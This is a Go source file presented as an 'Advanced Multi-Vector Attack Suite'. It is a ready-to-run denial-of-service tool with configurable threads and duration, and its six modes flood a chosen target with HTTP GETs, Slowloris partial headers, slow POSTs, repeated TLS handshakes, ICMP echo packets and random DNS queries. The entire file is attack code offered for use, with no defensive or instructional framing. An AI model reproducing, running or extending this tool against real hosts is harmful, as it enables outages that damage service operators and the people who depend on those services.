// vector_attacks.go
// Advanced Multi-Vector Attack Suite in Go
// Modes: http | slowloris | rudy | sslr | ping | dns

package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	mode     string
	target   string
	threads  int
	duration time.Duration
	rate     int
	timeout  time.Duration
	sni      string
)

func init() {
	flag.StringVar(&mode, "mode", "", "attack mode: http|slowloris|rudy|sslr|ping|dns")
	flag.StringVar(&target, "target", "", "target URL or host:port")
	flag.IntVar(&threads, "threads", 100, "number of concurrent workers")
	flag.DurationVar(&duration, "duration", 30*time.Second, "attack duration (e.g. 30s,1m)")
	flag.IntVar(&rate, "rate", 0, "max requests per second per worker (0=unlimited)")
	flag.DurationVar(&timeout, "timeout", 5*time.Second, "network timeout per request")
	flag.StringVar(&sni, "sni", "", "override TLS SNI for sslr mode")
}

func main() {
	flag.Parse()
	if mode == "" || target == "" {
		flag.Usage()
		os.Exit(1)
	}

	ctx, cancel := context.WithTimeout(context.Background(), duration)
	defer cancel()

	// Graceful shutdown on Ctrl+C
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() { <-c; cancel() }()

	// Metrics
	var success, failure uint64
	start := time.Now()

	// Stats printer
	wgStats := sync.WaitGroup{}
	wgStats.Add(1)
	go func() {
		defer wgStats.Done()
		t := time.NewTicker(1 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-t.C:
				s := atomic.LoadUint64(&success)
				f := atomic.LoadUint64(&failure)
				elapsed := time.Since(start).Seconds()
				fmt.Printf("[%.0fs][mode=%s][thr=%d] success=%d failure=%d\n",
					elapsed, mode, threads, s, f)
			case <-ctx.Done():
				return
			}
		}
	}()

	// Launch workers
	wg := sync.WaitGroup{}
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			switch mode {
			case "http":
				workerHTTP(ctx, &success, &failure)
			case "slowloris":
				workerSlowloris(ctx, &success, &failure)
			case "rudy":
				workerRUDY(ctx, &success, &failure)
			case "sslr":
				workerSSLReneg(ctx, &success, &failure)
			case "ping":
				workerPing(ctx, &success, &failure)
			case "dns":
				workerDNS(ctx, &success, &failure)
			default:
				atomic.AddUint64(&failure, 1)
			}
		}(i)
	}

	// Wait for workers and stats
	wg.Wait()
	wgStats.Wait()

	fmt.Println("Attack complete.")
}

// workerHTTP floods HTTP GETs
func workerHTTP(ctx context.Context, succ, fail *uint64) {
	client := http.Client{Timeout: timeout}
	var limiter <-chan time.Time
	if rate > 0 {
		limiter = time.Tick(time.Second / time.Duration(rate))
	}
	for {
		select {
		case <-ctx.Done():
			return
		case <-limiter:
			r, err := client.Get(target)
			if err != nil {
				atomic.AddUint64(fail, 1)
			} else {
				r.Body.Close()
				atomic.AddUint64(succ, 1)
			}
		default:
			if rate == 0 {
				r, err := client.Get(target)
				if err != nil {
					atomic.AddUint64(fail, 1)
				} else {
					r.Body.Close()
					atomic.AddUint64(succ, 1)
				}
			}
		}
	}
}

// workerSlowloris keeps many slow connections open
func workerSlowloris(ctx context.Context, succ, fail *uint64) {
	d := timeout
	for {
		select {
		case <-ctx.Done():
			return
		default:
			conn, err := net.DialTimeout("tcp", hostPort(), d)
			if err != nil {
				atomic.AddUint64(fail, 1)
				continue
			}
			// send initial headers
			conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + hostOnly() + "\r\nConnection: keep-alive\r\n"))
			// keep sending slow headers
			for {
				if ctx.Err() != nil {
					conn.Close()
					return
				}
				conn.Write([]byte(fmt.Sprintf("X-a: %d\r\n", rand.Int())))
				time.Sleep(15 * time.Second)
			}
		}
	}
}

// workerRUDY sends slow POST bodies
func workerRUDY(ctx context.Context, succ, fail *uint64) {
	client := http.Client{Timeout: timeout}
	data := strings.Repeat("A", 1024)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			req, err := http.NewRequest("POST", target, strings.NewReader(data))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			if err != nil {
				atomic.AddUint64(fail, 1)
				continue
			}
			resp, err := client.Do(req)
			if err != nil {
				atomic.AddUint64(fail, 1)
			} else {
				resp.Body.Close()
				atomic.AddUint64(succ, 1)
			}
			time.Sleep(10 * time.Millisecond)
		}
	}
}

// workerSSLReneg triggers TLS renegotiations (by reconnecting)
func workerSSLReneg(ctx context.Context, succ, fail *uint64) {
	config := &tls.Config{ServerName: sni, InsecureSkipVerify: true}
	d := timeout
	for {
		select {
		case <-ctx.Done():
			return
		default:
			conn, err := tls.DialWithDialer(&net.Dialer{Timeout: d}, "tcp", target, config)
			if err != nil {
				atomic.AddUint64(fail, 1)
			} else {
				atomic.AddUint64(succ, 1)
				conn.Close()
			}
		}
	}
}

// workerPing floods ICMP Echo requests
func workerPing(ctx context.Context, succ, fail *uint64) {
	conn, err := net.Dial("ip4:icmp", hostOnly())
	if err != nil { atomic.AddUint64(fail,1); return }
	defer conn.Close()
	packet := make([]byte, 64)
	for i := range packet { packet[i] = byte(rand.Intn(256)) }
	for {
		if ctx.Err() != nil { return }
		_, err := conn.Write(packet)
		if err != nil { atomic.AddUint64(fail,1) } else { atomic.AddUint64(succ,1) }
	}
}

// workerDNS floods DNS queries
func workerDNS(ctx context.Context, succ, fail *uint64) {
	server := target
	for {
		if ctx.Err() != nil { return }
		conn, err := net.DialTimeout("udp", server, timeout)
		if err != nil { atomic.AddUint64(fail,1); continue }
		// simple A query for random subdomain
		name := fmt.Sprintf("%d.example.com", rand.Int())
		msg := buildDNSQuery(name)
		_, err = conn.Write(msg)
		conn.Close()
		if err != nil { atomic.AddUint64(fail,1) } else { atomic.AddUint64(succ,1) }
	}
}

func hostPort() string {
	if strings.Contains(target, ":") {
		return target
	}
	return target + ":80"
}

func hostOnly() string {
	parts := strings.Split(target, ":")
	return parts[0]
}

// buildDNSQuery constructs a minimal DNS A query packet
func buildDNSQuery(name string) []byte {
	// [header: ID=0x1234, flags=0x0100, QD=1]
	head := []byte{0x12,0x34,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00}
	// encode name
	labels := strings.Split(name, ".")
	for _, l := range labels {
		head = append(head, byte(len(l)))
		head = append(head, []byte(l)...)
	}
	head = append(head, 0x00)           // end of name
	head = append(head, 0x00,0x01,0x00,0x01) // QTYPE=A, QCLASS=IN
	return head
}
